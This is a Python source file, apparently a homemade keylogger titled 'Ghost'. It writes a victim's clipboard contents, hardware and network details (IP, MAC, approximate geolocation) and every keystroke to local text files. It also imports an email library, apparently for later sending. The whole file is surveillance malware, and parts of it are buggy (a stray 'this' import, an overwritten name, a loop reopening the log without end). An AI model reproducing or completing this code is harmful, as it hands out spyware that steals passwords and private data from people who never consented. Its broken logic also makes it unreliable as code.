from multiprocessing.connection import Listener
import ssl
from this import s
from pynput import *
import socket
import platform
import win32clipboard
import re, uuid
import time
import geocoder
import folium
import smtplib


print(''' 
 / ___/ /  ___  ___ / /_
/ (_ / _ \/ _ \(_-</ __/
\___/_//_/\___/___/\__/ 
                        ''')

# Get the copied text from the computer
def get_clipboard():
    with open("clipboard.txt", "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Copied Clipboard Data: \n" + data)
        
        except:
            f.write("Clipboard data could not be copied.")

get_clipboard()

# Get computer information
def computer_information():
    with open("system.txt", "a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)

        g = geocoder.ip(IPaddr)

        address = str(g.latlng)

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPaddr + "\n")
        f.write("MAC Address: ")
        f.write(':'.join(re.findall('..', '%012x' % uuid.getnode())) + "\n")
        f.write("Lat + Lng: " + address + "\n")

computer_information()

# Logging the keys
def on_release(key):
    print(key)

    if key == keyboard.Key.space:
        key = " "
    elif key == keyboard.Key.enter:
        key = "\n"
    elif key == keyboard.Key.backspace:
        key = "\n[BACKSPACE]\n"
    elif key == keyboard.Key.ctrl:
        key = "\n[CTRL]\n"
    elif key == keyboard.Key.ctrl_l:
        key = "\n[CTRL_L]\n" 
    elif key == keyboard.Key.tab:
        key = "\n[TAB]\n"
    elif key == keyboard.Key.alt_l:
        key = "\n[ALT_L]\n"
    elif key == keyboard.Key.shift:
        key = "\n[SHIFT]\n"

    f.write(str(key).replace("'", ""))

Listener = keyboard.Listener(on_release=on_release)
Listener.start()

# Start the loop
while True:
    i = 0
    f = open("log.txt", "a")
